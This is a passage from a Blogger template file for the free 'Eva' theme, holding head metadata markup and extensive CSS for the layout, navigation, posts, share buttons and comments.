# momo<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr' xmlns:og='http://ogp.me/ns#'>
  <head>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
    <link href='http://fonts.googleapis.com/css?family=Playfair+Display:400,400i,700|Montserrat:400,400i,400,500,600,700,700i|Righteous' media='all' rel='stylesheet' type='text/css'/>
    <link href='//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
    <b:include data='blog' name='all-head-content'/>
    <title>
		<b:if cond='data:blog.pageType == &quot;index&quot;'>
			<data:blog.pageTitle/>
		<b:else/>
			<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
				<data:blog.pageName/> - <data:blog.title/>
			<b:else/>
				ERROR 404 - <data:blog.title/> 
			</b:if>
		</b:if>
    </title>
    <!-- Description and Keywords (start) -->
    <b:if cond='data:blog.pageType == &quot;index&quot;'>
    <meta content='YOUR DESCRIPTION HERE' name='description'/>
    </b:if>
    <meta content='YOUR KEYWORDS HERE' name='keywords'/>
    <!-- Description and Keywords (end) -->
    <b:if cond='data:blog.pageType == &quot;item&quot;'>
        <meta expr:content='data:blog.pageName' property='og:title'/>
        <meta expr:content='data:blog.canonicalUrl' property='og:url'/>
        <meta content='article' property='og:type'/>
    </b:if>
    <b:if cond='data:blog.postImageUrl'>
        <meta expr:content='data:blog.postImageUrl' property='og:image'/>
    <b:else/>
    <b:if cond='data:blog.postImageThumbnailUrl'>
        <meta expr:content='data:blog.postImageThumbnailUrl' property='og:image'/>
    </b:if></b:if>
    <b:if cond='data:blog.metaDescription != &quot;&quot;'>
        <meta expr:content='data:blog.metaDescription' name='og:description'/>
    </b:if>
    <meta expr:content='data:blog.title' property='og:site_name'/>
    <meta expr:content='data:blog.homepageUrl' name='twitter:domain'/>
    <meta expr:content='data:blog.pageName' name='twitter:title'/>
    <b:if cond='data:blog.postImageUrl'>
      <meta content='summary_large_image' name='twitter:card'/>
      <meta expr:content='data:blog.postImageUrl' name='twitter:image'/>
    <b:else/>
      <meta content='summary' name='twitter:card'/>
      <b:if cond='data:blog.postImageThumbnailUrl'>
        <meta expr:content='data:blog.postImageThumbnailUrl' name='twitter:image'/> 
      </b:if>
    </b:if>
    <meta expr:content='data:blog.pageName' name='twitter:title'/>
    <b:if cond='data:blog.metaDescription'>
      <meta expr:content='data:blog.metaDescription' name='twitter:description'/>
    </b:if>
    <!-- Social Media meta tag need customer customization -->
    <meta content='Facebook App ID here' property='fb:app_id'/> 
    <meta content='Facebook Admin ID here' property='fb:admins'/> 
    <meta content='@username' name='twitter:site'/>
    <meta content='@username' name='twitter:creator'/>   
  <b:skin><![CDATA[/* 
-----------------------------------------------
Blogger Template Style
Name:        Eva
Author :     http://www.Way2themes.com
License:     Free Version
----------------------------------------------- */
/* Variable definitions
-----------------------
<Variable name="bodybackground" description="Background" type="background" color="#fafafa" default="$(color) url() repeat fixed top left" value="$(color) url() repeat fixed top left"/>
<Variable name="maincolor" description="Primary Color" type="color" default="#00a68e"  value="#00a68e"/>
<Variable name="maindarkcolor" description="Primary Dark Color" type="color" default="#404040"  value="#404040"/>
-----------------------
*/
/*****************************************
reset.css
******************************************/
html, body, .section, .widget, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, font, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td, figure {    margin: 0;    padding: 0;}
html {   overflow-x: hidden;}
a {text-decoration:none;color:#000;}
article,aside,details,figcaption,figure,
footer,header,hgroup,menu,nav,section {     display:block;}
table {    border-collapse: separate;    border-spacing: 0;}
caption, th, td {    text-align: left;    font-weight: normal;}
blockquote:before, blockquote:after,
q:before, q:after {    content: "";}
.quickedit, .home-link{display:none;}
blockquote, q {    quotes: "" "";}
sup{    vertical-align: super;    font-size:smaller;}
code{    font-family: 'Courier New', Courier, monospace;    font-size:12px;    color:#272727;}
::selection {background:transparent; text-shadow:#000 0 0 2px;}
::-moz-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-webkit-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-o-selection {background:transparent; text-shadow:#000 0 0 2px;}
a img{	border: none;}
ol, ul { padding:0;  margin:0;  text-align: left;  }
ol li { list-style-type: decimal;  padding:0 0 5px;  }
ul li { list-style-type: disc;  padding: 0 0 5px;  }
ul ul, ol ol { padding: 0; }
#navbar-iframe, .navbar {   height:0px;   visibility:hidden;   display:none   }
.Attribution, .feed-links, .post-footer-line.post-footer-line-1, .post-footer-line.post-footer-line-2 , .post-footer-line.post-footer-line-3 {
display: none;
}
.item-control {
display: none !important;
}
abbr.published.timeago {
    text-decoration: none;
}
.post-body a, .post-body a:link, .post-body a:visited {
color:$maincolor;
font-weight:bold;
}
h2.date-header, h4.date-header {display:none;margin:1.5em 0 .5em}
h1, h2, h3, h4, h5, h6 {
font-family: 'Playfair Display', serif;;
font-weight: 400;
color: #151515;
}
blockquote {
padding: 8px;
background-color: #faebbc;
border-top: 1px solid #e1cc89;
border-bottom: 1px solid #e1cc89;
margin: 5px;
background-image: url(http://1.bp.blogspot.com/-siy6EKYCLtM/U6X4AdKrr0I/AAAAAAAANDs/HCjRvuedDro/s1600/openquote1.gif);
background-position: top left;
background-repeat: no-repeat;
text-indent: 23px;
}
blockquote p{
display: block;
background-image: url(http://3.bp.blogspot.com/-UjppXQI-ww0/U6X4IpheNiI/AAAAAAAAND0/PJhRvvhAWGU/s1600/closequote1.gif);
background-repeat: no-repeat;
background-position: bottom right;
}
img {
    max-width: 100%;
    vertical-align: middle;
}
* {
    outline: 0;
    transition: all .3s ease;
    -webkit-transition: all .3s ease;
    -moz-transition: all .3s ease;
    -o-transition: all .3s ease;
}
.item #blog-pager {
    display: none;
    height: 0;
    opacity: 0;
    visibility: hidden;
}
.widget iframe, .widget img {
max-width: 100%;
}
.status-msg-wrap {
display: none;
}
a:hover {
color:$maincolor;
}
/*****************************************
Custom css starts
******************************************/
body {
color: $maindarkcolor;
font-family: Montserrat;
font-size: 14px;
font-weight: normal;
line-height: 21px;
background: $bodybackground;
}
/* ######## Wrapper Css ######################### */
#outer-wrapper{max-width:100%;margin:0 auto}
.row{width:1150px}
#content-wrapper {
margin: 0 auto;
padding: 20px 0 40px;
overflow: hidden;
}
#main-wrapper {
float: left;
    width: 70%;
    padding-right: 10px;
    max-width: 800px;
    box-sizing: border-box;
}
#sidebar-wrapper {
float: right;
width: 30%;
max-width: 330px;
}
/* ######## Top Header Bar Css ######################### */
.top-bar {
  background: rgba(255,255,255,.99);
}
.top-bar-wrapper {
position: relative;
overflow: hidden;
min-height:40px;
color: $maindarkcolor;
margin:0 auto;
border-bottom:1px solid rgba(0,0,0,0.12);
}
.top-bar-social, .bottom-bar-social {
float: right;
padding: 5px 0;
}
 .bottom-bar-social {
float: right;
    text-align: center;
}
.bottom-bar-social {
padding:0 0;
}
.top-bar-social li, .bottom-bar-social li {
display: inline;
padding: 0;
float: left;
margin-right: 5px;
}
.bottom-bar-social li {
display: inline-block;
padding: 0;
float: none;
}
.top-bar-social li:last-child,.bottom-bar-social li:last-child {
margin-right:0;
}
.top-bar-social .widget ul, .bottom-bar-social .widget ul {
padding: 0;
}
.top-bar-social .LinkList ul, .bottom-bar-social .LinkList ul {
text-align: center;
}
.top-bar-social #social a {
display: block;
    width: 30px;
    height: 30px;
    line-height: 30px;
    font-size: 12px;
    color: $maindarkcolor;
    -webkit-border-radius: 100%;
    -moz-border-radius: 100%;
    border-radius: 100%;
    transition: background 0.3s linear;
    -moz-transition: background 0.3s linear;
    -webkit-transition: background 0.3s linear;
    -o-transition: background 0.3s linear;
}
.bottom-bar-social #social a {
display: block;
width: 30px;
height: 30px;
line-height: 30px;
font-size: 15px;
color: #808080;
transition: color 0.3s linear;
-moz-transition: color 0.3s linear;
-webkit-transition: color 0.3s linear;
-o-transition: color 0.3s linear;
-webkit-border-radius: 100%;
-moz-border-radius: 100%;
border-radius: 100%;
}
.top-bar-social #social a:before, .bottom-bar-social #social a:before {
display: inline-block;
font: normal normal normal 22px/1 FontAwesome;
font-size: inherit;
font-style: normal;
font-weight: 400;
-webkit-font-smoothing: antialiased;
-moz-osx-font-smoothing: grayscale;
}
.top-bar-social .bloglovin:before, .bottom-bar-social .bloglovin:before{content:"\f004"}
.top-bar-social .facebook:before, .bottom-bar-social .facebook:before{content:"\f09a"}
.top-bar-social .twitter:before, .bottom-bar-social .twitter:before{content:"\f099"}
.top-bar-social .gplus:before, .bottom-bar-social .gplus:before{content:"\f0d5"}
.top-bar-social .rss:before, .bottom-bar-social .rss:before{content:"\f09e"}
.top-bar-social .youtube:before, .bottom-bar-social .youtube:before{content:"\f167"}
.top-bar-social .skype:before, .bottom-bar-social .skype:before{content:"\f17e"}
.top-bar-social .stumbleupon:before, .bottom-bar-social .stumbleupon:before{content:"\f1a4"}
.top-bar-social .tumblr:before, .bottom-bar-social .tumblr:before{content:"\f173"}
.top-bar-social .vine:before, .bottom-bar-social .vine:before{content:"\f1ca"}
.top-bar-social .stack-overflow:before, .bottom-bar-social .stack-overflow:before{content:"\f16c"}
.top-bar-social .linkedin:before, .bottom-bar-social .linkedin:before{content:"\f0e1"}
.top-bar-social .dribbble:before, .bottom-bar-social .dribbble:before{content:"\f17d"}
.top-bar-social .soundcloud:before, .bottom-bar-social .soundcloud:before{content:"\f1be"}
.top-bar-social .behance:before, .bottom-bar-social .behance:before{content:"\f1b4"}
.top-bar-social .digg:before, .bottom-bar-social .digg:before{content:"\f1a6"}
.top-bar-social .instagram:before, .bottom-bar-social .instagram:before{content:"\f16d"}
.top-bar-social .pinterest:before, .bottom-bar-social .pinterest:before{content:"\f0d2"}
.top-bar-social .delicious:before, .bottom-bar-social .delicious:before{content:"\f1a5"}
.top-bar-social .codepen:before, .bottom-bar-social .codepen:before{content:"\f1cb"}
.top-bar-social .email:before, .bottom-bar-social .email:before{content:"\f0e0"}
.top-bar-social ul#social a:hover, .bottom-bar-social ul#social a:hover {
color: $maincolor;
opacity: 1;
}
.top-bar-menu {
float: left;
   padding: 5px 0 0;
}
#searchform fieldset {
    float: left;
    color: #222;
    border: 1px solid #ccc;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    background: #f6f6f6;
position:relative;
}
#searchform {
   position: absolute;
    right: 5px;
    top: 12px;
    z-index: 99;
}
#searchform fieldset:hover {
    border: 1px solid #e1eaed;
}
#s {
    float: left;
    color: #888;
    background: none;
    border-width: 0 1px 0 0;
    border-weight: solid;
    border-color: #ccc;
    margin: 6px 0;
    padding: 0 8px;
}
#searchform .sbutton {
    cursor: pointer;
    padding: 6px 8px;
    float: right;
}
#s:active, #s:focus {
    border: none;
    outline: none;
    box-shadow: none;
}
.selectnav {display:none}
/* ######## Header Css ######################### */
#header-wrapper {
text-align:center;
}
#header-wrappers {
color: $maindarkcolor;
padding: 20px 0 0;
margin: 0 auto;
}
#header-inner {
display:inline-block;
background-position: left;
background-repeat: no;
}
.headerleft img {
height: auto;
margin: 0 0 0;
}
.headerleft h1,
.headerleft h1 a,
.headerleft h1 a:hover,
.headerleft h1 a:visited {
    font-family:  'Righteous', cursive;
    color: #151515;
    font-size: 55px;
    font-weight: bold;
    line-height: 68px;
    margin: 0;
    padding: 0 0 5px;
    text-decoration: none;
    text-transform: uppercase;
}
.headerleft h3 {
font-weight: 400;
margin: 0;
padding: 0;
}
.headerleft .description {
color: #000000;
    font: normal 14px 'Playfair Display', sans-serif;
    margin: 0;
    padding: 10px 0;
    text-transform: capitalize;
    font-style: italic;
    text-align: right;
}
.headerleft {
margin: 0;
padding: 0;
}
/* ######## Navigation Menu Css ######################### */
.selectnav {
display:none;
}
.tm-menu {
    font-weight: 400;
    margin: 0 auto;
    height:50px;
border-bottom: 1px solid #e5e5e5;
    box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
    background-color: #fff;
}
.makesticking{position:fixed!important;top:0;z-index:99;-webkit-transform:translateZ(0);}
ul#nav {
    list-style: none;
    margin: 0;
    padding: 0;
}
#menu .widget {
    display: none;
}
#menu {
    height: 50px;
    position: relative;
    text-align: center;
    z-index: 15;
margin:0;
max-width: 930px; 
    padding-left: 5px;
}
.menu-wrap {
margin:0 auto;
position: relative;
}
#menu ul > li {
    position: relative;
    vertical-align: middle;
    display: inline-block;
    padding: 0;
    margin: 0;
}
#menu ul > li.hub-home a {
color:$maincolor;
}

#menu ul > li:hover > a {
   
}
#menu ul > li > a {
    color: $maindarkcolor;
    font-size: 14px;
    font-weight: 600;
    line-height: 50px;
    display: inline-block;
    text-transform: uppercase;
    text-decoration: none;
    letter-spacing: 1px;
    margin:0;
    padding: 0 12px;
   font-family: 'Montserrat', sans-serif;
}

#menu ul > li > ul > li:first-child > a {
    padding-left: 12px
}
#menu ul > li > ul {
    position: absolute;
    background: #fff;
    top: 100%;
    left: 0;
    min-width: 180px;
    padding: 0;
    z-index: 99;
    margin-top: 0;
    visibility: hidden;
    opacity: 0;
    border: 1px solid $maindarkcolor;
    -webkit-transform: translateY(10px);
    -moz-transform: translateY(10px);
    transform: translateY(10px)
}
#menu ul > li > ul > li > ul {
    position: absolute;
    top: 0;
    left: 180px;
    width: 180px;
    background: #fff;
    z-index: 99;
    margin-top: 0;
    margin-left: 0;
    padding: 0;
    border-left: 1px solid #6d6d6d;
    visibility: hidden;
    opacity: 0;
    -webkit-transform: translateY(10px);
    -moz-transform: translateY(10px);
    transform: translateY(10px)
}
#menu ul > li > ul > li {
    display: block;
    float: none;
    text-align: left;
    position: relative;
border-bottom: 1px solid;
    border-top: none;
    border-color: #8d8d8d;
}
#menu ul > li > ul > li:last-child {
    border: 0;
}

#menu ul li.parent ul li:after, #menu ul li:last-child:after {
   display:none;
}
#menu ul > li:hover a {
    background-color: $maincolor;
color:#fff;
}
#menu ul > li:hover li a {
background:none;
color:$maindarkcolor;
}
#menu ul > li > ul > li a {
    font-size: 11px;
    display: block;
    color: $maindarkcolor;
    line-height: 35px;
    text-transform: uppercase;
    text-decoration: none;
    margin: 0;
    padding: 0 12px;
    border-right: 0;
    border: 0;
background:none;
}
#menu ul > li.parent > a:after {
    content: '\f107';
    font-family: FontAwesome;
    float: right;
    margin-left: 5px
}
#menu ul > li:hover > ul,
#menu ul > li > ul > li:hover > ul {
    opacity: 1;
    visibility: visible;
    -webkit-transform: translateY(0);
    -moz-transform: translateY(0);
    transform: translateY(0)
}
#menu ul > li > ul > li.parent > a:after {
    content: '\f105';
    float: right
}
#menu ul ul {

}
.ty-ran-yard {
  position: absolute;
    right: 0;
    top: 0;
    z-index: 99;
}
.ty-ran-yard span {
    list-style: none;
}
.ty-ran-yard a.ran-sym {
    background-color: $maincolor;
    cursor: pointer;
    display: block;
    height: 50px;
    text-align: center;
    position: relative;
    right: 0;
    top: 0;
    width: 50px;
    border-radius: 0;
    box-sizing: border-box;
}
.ty-ran-yard a.ran-sym:hover {
background-color:#6d6d6d;
}
.ty-ran-yard a.ran-sym:before {
    color: #fff;
    content: '\f074';
    font-family: FontAwesome;
    font-size: 16px;
    text-rendering: auto;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    line-height: 50px;
}

/* ######## Sidebar Css ######################### */
.sidebar .widget, .mini-sidebar .widget {
margin-bottom: 20px;
position: relative;
clear: both;
    border: 1px solid #e5e5e5;
    background: #fff;
    box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
}
.sidebar h2 {
    font-size: 16px;
    line-height: 23px;
    font-weight: 700;
    text-transform: uppercase;
    border-bottom: 1px solid #e5e5e5;
 padding: 10px 20px;
    font-family: Montserrat;
}
.sidebar ul,.sidebar li, .mini-sidebar ul,.mini-sidebar li {
list-style-type:none;
margin:0;
padding: 0;
}
.sidebar .LinkList li, .mini-sidebar .LinkList li {
padding: 0 0 6px 0;
    margin: 0 0 6px 0;
text-transform:capitalize;
}

.sidebar .widget-content {
    padding: 10px 20px;
}
/* ######## Post Css ######################### */
article {
    padding:0;
    overflow: hidden;
}

.post {
    display: block;
    overflow: hidden;
    word-wrap: break-word;
border: 1px solid #e5e5e5;
    box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
    background: #fff;
}
.item .post-body, .static_page .post-body {
background:#fff;
}
.item .post-header, .static_page .post-header {
background:#fff;
}
.static_page .post-header {
border-width:1px 1px 0;
}
.index .post, .archive .post {
 margin: 0 0 15px 0;
}
.index .ty-index-head, .archive .ty-index-head {
    padding: 20px;
padding-bottom:0;
}
.index .date-header-post, .archive .date-header-post {
    padding: 20px;
padding-top:0;
}
.post-head h1 {
    color: #000;
    font-size: 32px;
    font-weight: 400;
    line-height: 44px;
}
.ty-index-head {
    margin-bottom: 10px;
text-align:center;
}
.index .post h2, .archive .post h2 {
margin-bottom: 12px;
line-height: 36px;
    font-size: 30px;
    font-weight: 700;
}
.post h2 a {
color: #404040;
}
.post h2 a:hover {
    color: $maincolor;
}
.index .post h2, .archive .post h2 {
    margin: 0 0 10px;
    padding: 0;
    text-transform: capitalize;
}


.retitle h2 {
    display: block;
}
.post-body {
margin: 0px;
padding:10px;
font-size: 14px;
line-height: 26px;
    box-sizing: border-box;
}
.widget .post-body ul, .widget .post-body ol {
    padding-left: 15px;
}

.block-image {
float:none;
width: 100%;
height: auto;
margin-bottom: 15px;
position:relative;
}
.block-image .thumb {
width: 100%;
height: auto;
position: relative;
display: block;
overflow: hidden;
}
.block-image .thumb img {
width: 100%;
height: 350px;
display: block;
transition: all .3s ease-out!important;
-webkit-transition: all .3s ease-out!important;
-moz-transition: all .3s ease-out!important;
-o-transition: all .3s ease-out!important;
}
.block-image .thumb > a:before {
    position: absolute;
    content: '';
    width: 100%;
    height: 100%;
    background-color: #000;
    opacity: 0;
z-index:1;
    left: 0;
    top: 0;
    -webkit-transition: all 0.35s ease-in-out;
    -moz-transition: all 0.35s ease-in-out;
    -ms-transition: all 0.35s ease-in-out;
    -o-transition: all 0.35s ease-in-out;
    transition: all 0.35s ease-in-out;
}
.block-image .thumb:hover > a:before {
    opacity: 0.3;
}
.block-image .thumb:hover img {
transform: scale(1.1) rotate(-1deg);
    transition: all .3s ease-in-out;
}
.date-header-post {
    color: #bdbdbd;
    display: block;
    font-size: 12px;
    font-weight: 400;
    line-height: 1.3em;
    margin: 0!important;
    padding: 0;
}
.date-header-post a {
    color: #bdbdbd;
}
.post-head {
    padding:20px 10px;
}
.index .post-head, .archive .post-head {
padding:0;
}
#meta-post {
    color: #bdbdbd;
    display: block;
    font-size: 12px;
    font-weight: 500;
    line-height: 21px;
    margin: 0;
    padding:0;
    text-transform: capitalize;
}
#meta-post a, #meta-post abbr {
    color: $maincolor;
    font-weight: 500;
}
#meta-post a:hover, #meta-post abbr:hover {
    color: #f8695f;
}
#meta-post .auth-meta i {
    margin-left: 0;
}
#meta-post i {
    margin-left: 5px;
    margin-right: 2px;
}

.top-image{margin:0;    padding: 10px ;    background: #e5e5e5;}

.post-meta {
    color: #bdbdbd;
    display: block;
    font-size: 12px;
    font-weight: 500;
    line-height: 21px;
    margin: 0;
    padding: 0 10px;
text-transform: capitalize;
}
.post-meta-wrap {
padding:10px 0;
border-bottom: 1px solid rgba(0,0,0,0.12);
border-top: 1px solid rgba(0,0,0,0.12);
}
.post-meta a, .post-meta abbr {
    color: $maincolor;
font-weight:500;
}
 .post-meta i {
        margin-left: 5px;
    margin-right: 2px;
}
.post-timestamp {
    margin-left: 5px;
}
.label-head {
    margin-left: 5px;
}
.label-head a {
    padding-left: 2px;
}
.resumo {
    color: #3e4146;
}
.resumo span {
    display: block;
    margin-bottom: 8px;
font-size: 14px;
       line-height: 1.6em;
    text-overflow: ellipsis;
text-align: justify;
}
.post-body img {
max-width: 100%;
padding: 10px 0;
position: relative;
margin:0 auto;
}
.second-meta {
    padding: 10px 0 0;
    display: block;
    overflow: hidden;
    border-top: 1px solid #e5e5e5;
}
.second-meta .share-box {
    padding: 20px 20px 10px;
    padding-top: 0;
    overflow: hidden;
}
.second-meta .share-art a span {
    display: none;
}
.second-meta .read-art:hover {
color:#fff;
background:$maincolor;
border-color:$maindarkcolor;
}

.comment-link {
    white-space: normal;
}
#blog-pager {
    clear: both;
    text-align: center;
    margin: 0;
    font-family: 'Montserrat', sans-serif;
}
.index .pagenavi, .archive .pagenavi {
    display: inline-block;
    border: 2px solid #151515;
background:#fff;
}
.index .blog-pager,
.index #blog-pager {
    display: block
}
.index .blog-pager,
.index #blog-pager,
.archive .blog-pager,
.archive #blog-pager {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    border-radius: 0;
    padding: 0;
    text-align: center;
}
.showpageNum a,
.showpage a,
#blog-pager-newer-link a,
#blog-pager-older-link a {
   color: $maindarkcolor;
    font-size: 14px;
    font-weight: 700;
    overflow: hidden;
    padding: 10px 15px;
    text-decoration: none;
float:left;
}
.item #blog-pager-older-link a {
float:none;
}
.showpageNum:last-child a {
border:0;
}
.showpageNum a:hover,
.showpage a:hover,
#blog-pager-newer-link a:hover,
#blog-pager-older-link a:hover {
    decoration: none;
    color: $maincolor
}
.showpageOf {
   color: #151515;
    font-size: 14px;
    font-weight: 700;
    overflow: hidden;
    padding: 10px 15px;
    text-decoration: none;
float:left;
}
.showpagePoint {
    color: #151515;
    font-size: 14px;
    font-weight: 700;
    overflow: hidden;
    padding: 10px 15px;
    text-decoration: none;
float:left;
}
#post-pager .blog-pager-older-link:hover, #post-pager .blog-pager-newer-link:hover {
color:$maincolor;
background:inherit;
}
#post-pager {
clear:both;
    float: left;
    display: block;
    width: 100%;
    box-sizing: border-box;
margin: 15px 0 0;
padding:10px;
border-top: 1px solid #e5e5e5;
background:#fff;
}
#post-pager .blog-pager-older-link, #post-pager .blog-pager-newer-link {
border:0;
text-align:right;
background:none;
color:$maindarkcolor;
}
#post-pager .blog-pager-newer-link {
    border: 0;
text-align:left;
}
#post-pager #blog-pager-newer-link, #post-pager #blog-pager-older-link {
    width: 50%;
}
#post-pager a b {
    display: block;
    padding: 0 0 5px;
    font-weight: 700;
    letter-spacing: 1px;
    font-size: 13px;
color:$maincolor;
 font-family: 'Montserrat', sans-serif;
text-transform:uppercase;
}
#post-pager a span {
    text-transform:capitalize;
font-family:Playfair Display;
}
#post-pager .blog-pager-older-link, #post-pager .blog-pager-newer-link {
    padding:0;
display: block;
}
/* ######## Share widget Css ######################### */
.item .post-footer .share-box .post-labels {
    float: left;
}

.item .post-footer .share-box .post-labels .label-title {
    color: #fff;
    padding: 3px 8px;
    font-size: 13px;
    background-color: $maincolor;
}
.item .post-footer .share-box .post-labels a {
    color: $textcolor;
    padding: 3px 8px;
    font-size: 13px;
    background-color: #f8f8f8;
}
.post-footer .share-box {
border-top: 1px solid #e5e5e5;
border-bottom: 1px solid #e5e5e5;
    background: #fff;
position: relative;
padding: 10px 10px;
    margin:0;
text-align: center;
overflow:hidden;
}
.post-footer .share-title {
border-bottom: 2px solid #eee;
color: #010101;
display: inline-block;
font-size: 15px;
font-weight: 500;
clear: both;
margin: 0;
position: relative;
float: left;
}
.sora-author-box {
overflow: hidden;
margin: 10px 0;
}
.sora-author-box img {
float: left;
margin-right: 10px;
object-fit:cover;
}
.sora-author-box p {
padding: 0 10px 10px;
-webkit-margin-before: 0;
-webkit-margin-after: 0;
}
.sora-author-box b {
font-weight: 700;
font-style: normal;
letter-spacing: 1px;
font-size: 20px;
}
.Related-title {
    padding: 0;
    margin: 0 0 20px;
position:relative;
    display: block;
}
.Related-title:before {
position: absolute;
content: '';
width: 100%;
height: 2px;
background-color: $maindarkcolor;
top: 10px;
z-index: 0;
}
.Related-title span {
position: relative;
display: inline-block;
font-size: 14px;
font-weight: 700;
text-transform: uppercase;
letter-spacing: 2px;
background-color: #fff;
padding: 0 10px 0 0;
z-index: 1;
color:#000;
}
.share-box {
position: relative;
}
.second-meta .share-art a {
padding: 6px 8px;
    border-radius: 3px;
}
.second-meta .share-art {
float:none;
}
.share-art {
float:right;
padding: 0;
padding-top: 0;
font-size: 13px;
font-weight: 400;
text-transform: capitalize;
}
.share-art a {
color: #fff;
padding: 3px 8px;
margin-left: 4px;
border-radius: 2px;
display: inline-block;
margin-right: 0;
background: #010101;
}
.second-meta .share-art a {
float: left;
}
.share-art a span {
 
}
.second-meta .share-art a.fac-art {
margin-left:0;
}
.second-meta .share-art a.read-art {
float:right;
}
.share-art a:hover{color:#fff}
.share-art .fac-art{background:#3b5998}
.share-art .fac-art:hover{background:rgba(49,77,145,0.7)}
.share-art .twi-art{background:#00acee}
.share-art .twi-art:hover{background:rgba(7,190,237,0.7)}
.share-art .goo-art{background:#db4a39}
.share-art .goo-art:hover{background:rgba(221,75,56,0.7)}
.share-art .pin-art{background:#CA2127}
.share-art .pin-art:hover{background:rgba(202,33,39,0.7)}
.share-art .lin-art{background:#0077B5}
.share-art .lin-art:hover{background:rgba(0,119,181,0.7)}
.share-art .wat-art{background:#25d266;display:none;}
.share-art .wat-art:hover{background:rgba(37, 210, 102, 0.73)}
@media only screen and (max-width: 768px) {
.share-art .wat-art{display:inline-block;}
}
/* ######## Comments Css ######################### */
.comments {
clear: both;
margin: 0;
color: #48494d;
margin-top:10px;
background: #FFF;
border: 1px solid #e5e5e5;
    border-top: 0;

}
.comments .comments-content {
box-sizing: border-box;
padding: 10px;
border-top:0;
}
.post-feeds .feed-links {
display: none;
}
iframe.blogger-iframe-colorize,
iframe.blogger-comment-from-post {
height: 260px!important;
background: #fff;
}
.comment-form {
overflow:hidden;
}
.comments h3 {
line-height:normal;
text-transform:uppercase;
color:#333;
font-weight:bold;
margin:0 0 20px 0;
font-size:14px;
padding:0 0 0 0;
}
h4#comment-post-message {
display:none;
margin:0 0 0 0;
}
.comments h4{
color: #4c4c4c;
background: #e5e5e5;
font-size: 16px;
padding: 12px 10px;
margin: 0;
font-weight: 700;
letter-spacing: 1.5px;
text-transform: uppercase;
position: relative;
text-align: left;
}
.comments h4:after {
    display: inline-block;
    content: "\f075";
    font-family: fontAwesome;
    font-style: normal;
    font-weight: normal;
    font-size: 16px;
    color: $maincolor;
    top: 0;
    right: 0;
    padding: 12px 20px;
    position: absolute;
}
.comments .comments-content{
font-size:13px;
}
.comments .comments-content .comment-thread ol{
list-style:none;
text-align:left;
margin:13px 0;
padding:0
}
.comments .comments-content .comment-thread ol li{
list-style:none;
}
.comments .avatar-image-container {
background:#fff;
border:1px solid #DDD;
overflow:hidden;
padding:0;
border-radius: 50%;
}
.comments .avatar-image-container img {
border-radius:50%;
}
.comments .comment-block{
position:relative;
background:#fff;
padding:15px;
margin-left:60px;
border: 1px solid #efefef;
}
.comments .comment-block:before {
content:"";
width:0px;
height:0px;
position:absolute;
right:100%;
top:14px;
border-width:10px;
border-style:solid;
border-color:transparent #DDD transparent transparent;
display:block;
}
.comments .comments-content .comment-replies{
margin:8px 0;
margin-left:60px
}
.comments .comments-content .comment-thread:empty{
display:none
}
.comments .comment-replybox-single {
background:#f0f0f0;
padding:0;
margin:8px 0;
margin-left:60px
}
.comments .comment-replybox-thread {
background:#f0f0f0;
margin:8px 0 0 0;
padding:0;
}
.comments .comments-content .comment{
margin-bottom:6px;
padding:0
}
.comments .comments-content .comment:first-child {
padding:0;
margin:0
}
.comments .comments-content .comment:last-child {
padding:0;
margin:0
}
.comments .comment-thread.inline-thread .comment, .comments .comment-thread.inline-thread .comment:last-child {
margin:0px 0px 5px 30%
}
.comment .comment-thread.inline-thread .comment:nth-child(6) {
margin:0px 0px 5px 25%;
}
.comment .comment-thread.inline-thread .comment:nth-child(5) {
margin:0px 0px 5px 20%;
}
.comment .comment-thread.inline-thread .comment:nth-child(4) {
margin:0px 0px 5px 15%;
}
.comment .comment-thread.inline-thread .comment:nth-child(3) {
margin:0px 0px 5px 10%;
}
.comment .comment-thread.inline-thread .comment:nth-child(2) {
margin:0px 0px 5px 5%;
}
.comment .comment-thread.inline-thread .comment:nth-child(1) {
margin:0px 0px 5px 0;
}
.comments .comments-content .comment-thread{
margin:0;
padding:0
}
.comments .comments-content .inline-thread{
background: #fff;
padding:15px;
box-sizing:border-box;
margin:0
}
.comments .comments-content .inline-thread .comment-block {
border-color: $maincolor;
}
.comments .comments-content .inline-thread .comment-block:before {
border-color: transparent $maincolor transparent transparent;
}
.comments .comments-content .user {
font-family: Montserrat;
letter-spacing: 0.5px;
font-weight: 500;
}
.comments .comments-content .icon.blog-author {
display:inline;
}
.comments .comments-content .icon.blog-author:after {
content: "Author";
background:$maincolor;
font-family:'Playfair Display', serif;
color: #fff;
font-size: 11px;
padding: 2px 5px;
text-transform:Capitalize;
font-style:italic;
letter-spacing: 0.3px;
}
.comment-header {
text-transform:uppercase;
font-size:12px;
}
.comments .comments-content .datetime {
margin-left: 6px;
}
.comments .comments-content .datetime a {
color:#888;
}
.comments .comment .comment-actions a {
display:inline-block;
color:#333;
font-weight:bold;
font-size:10px;
line-height:15px;
margin:4px 8px 0 0;
}
.comments .continue a {
color:#333;
display:inline-block;
font-size:10px;
}
.comments .comment .comment-actions a:hover, .comments .continue a:hover{
text-decoration:underline;
}
/* ######## Related Post Css ######################### */
#related-posts {
background: #fff;
    padding: 0 0 10px;
}
h4.related-title {
    font-size: 14px;
    margin: 0 0 10px 0;
    background: #e5e5e5;
    color: #4c4c4c;
    padding: 15px 20px;
    font-weight: 700;
    position: relative;
    text-align: left;
